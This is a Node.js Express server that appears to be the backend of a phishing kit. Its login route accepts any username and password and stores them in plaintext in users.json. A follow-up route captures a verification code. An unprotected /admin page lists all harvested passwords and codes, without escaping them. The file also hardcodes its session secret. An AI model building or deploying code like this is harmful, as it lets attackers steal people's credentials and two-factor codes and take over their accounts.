const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;



app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

const usersFile = path.join(__dirname, "users.json");

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "login.html"));
});

const session = require("express-session");

app.use(session({
    secret: "snaptext-secret",
    resave: false,
    saveUninitialized: true
}));



// SAVE LOGIN DATA
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    const users = JSON.parse(fs.readFileSync(usersFile));
    const newUser = { username, password };

    users.push(newUser);
    fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));

    req.session.user = username;   // SAVE SESSION
    res.redirect("/code.html");
});


// SAVE CODE
app.post("/verify-code", (req, res) => {
    const { code } = req.body;

    const users = JSON.parse(fs.readFileSync(usersFile));
    if (users.length > 0) {
        users[users.length - 1].code = code;
        fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
    }

    req.session.verified = true;
    res.redirect("/success");
});

// PROTECTED SUCCESS ROUTE

app.get("/success", (req, res) => {
    if (!req.session.user || !req.session.verified) {
        return res.redirect("/");
    }
    res.sendFile(path.join(__dirname, "public", "success.html"));
});


// ADMIN PAGE TO SEE DATA
app.get("/admin", (req, res) => {
    const users = JSON.parse(fs.readFileSync(usersFile));
    let html = "<h1>Stored Users</h1><table border='1'><tr><th>Username</th><th>Password</th><th>Code</th></tr>";

    users.forEach(user => {
        html += `<tr><td>${user.username}</td><td>${user.password}</td><td>${user.code || ""}</td></tr>`;
    });

    html += "</table>";
    res.send(html);
});

// LOGOUT

app.get("/logout", (req, res) => {
    req.session.destroy(() => {
        res.redirect("/");
    });
});

app.get("/user", (req, res) => {
    res.json({ user: req.session.user || null });
});



app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
